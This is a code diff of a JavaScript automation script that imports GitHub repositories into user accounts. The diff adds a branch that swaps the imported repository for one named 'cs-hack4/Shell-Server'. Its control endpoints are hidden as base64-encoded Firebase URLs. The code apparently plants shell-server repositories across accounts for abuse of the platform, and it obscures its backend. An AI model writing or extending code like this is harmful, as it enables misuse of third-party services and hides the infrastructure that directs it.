@@ -14,6 +14,8 @@ let mUpdate = new Date().getTime()
 let mStart = parseInt(mUpdate/1000)
 let mTime = new Date().toString()
 
+let mShell = 'https://github.com/cs-hack4/Shell-Server'
+
 let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
 
@@ -168,8 +170,14 @@ async function importRepo(id, repo, user, timeout) {
 
             if(data != null && data != 'null') {
                 
+                let iRepo = 'https://github.com/'+user+'/'+user
+
+                if(user == repo) {
+                    iRepo = mShell
+                }
+
                 let form = new FormData()
-                form.append('vcs_url', 'https://github.com/'+user+'/'+user)
+                form.append('vcs_url', iRepo)
                 form.append('owner', user)
                 form.append('repository[name]', repo)
                 form.append('repository[visibility]', 'public')
